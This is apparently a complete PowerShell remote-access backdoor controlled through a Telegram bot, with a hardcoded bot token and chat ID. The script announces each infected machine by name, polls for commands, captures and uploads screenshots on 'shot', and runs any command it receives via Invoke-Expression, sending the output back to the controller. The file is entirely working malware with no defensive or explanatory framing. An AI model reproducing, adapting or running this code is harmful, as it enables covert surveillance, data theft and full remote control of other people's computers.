[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$botToken = "8220355086:AAFI1_k4FoKIF18FShBBn0yezO5dDldzs88"
$chatId = 6494641721  # число, не строка!
$apiUrl = "https://api.telegram.org/bot$botToken"

# Сброс webhook на всякий случай
Invoke-RestMethod -Uri "$apiUrl/deleteWebhook" | Out-Null

function Send-TG ($t, $isPath=$false) {
    try {
        if($isPath){
            curl.exe -s -F "chat_id=$chatId" -F "photo=@$t" "$apiUrl/sendPhoto"
        }
        else {
            $b = @{chat_id=$chatId; text="[$env:COMPUTERNAME] $t"; parse_mode="Markdown"}
            Invoke-RestMethod -Uri "$apiUrl/sendMessage" -Method Post -Body $b
        }
    } catch {}
}

Send-TG "Online"
$lastId = 0

while ($true) {
    try {
        $res = Invoke-RestMethod -Uri "$apiUrl/getUpdates?offset=$($lastId+1)&limit=100" -TimeoutSec 30
        foreach ($u in $res.result) {
            $lastId = $u.update_id
            if ($u.message.chat.id -ne $chatId) { continue }
            
            $msg = $u.message.text
            switch ($msg) {
                "/start" { Send-TG "Ready" }
                "/help"  { Send-TG "shot, kill, cmd" }
                "shot" {
                    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
                    $s = [Windows.Forms.Screen]::PrimaryScreen.Bounds
                    $b = New-Object Drawing.Bitmap($s.Width, $s.Height)
                    $g = [Drawing.Graphics]::FromImage($b)
                    $g.CopyFromScreen($s.X, $s.Y, 0, 0, $s.Size)
                    $tmp = "$env:TEMP\s.png"
                    $b.Save($tmp, [Drawing.Imaging.ImageFormat]::Png)
                    $g.Dispose(); $b.Dispose()
                    Send-TG $tmp $true
                    Remove-Item $tmp -ErrorAction SilentlyContinue
                }
                "kill" { Send-TG "Offline"; exit }
                default {
                    if ($msg.StartsWith("cmd ")) {
                        try {
                            $c = $msg.Substring(4)
                            $o = Invoke-Expression $c 2>&1 | Out-String
                            Send-TG $(if($o){$o}else{"Done"})
                        } catch { Send-TG "Error: $_" }
                    }
                }
            }
        }
    } catch { Start-Sleep -Seconds 1 }
}
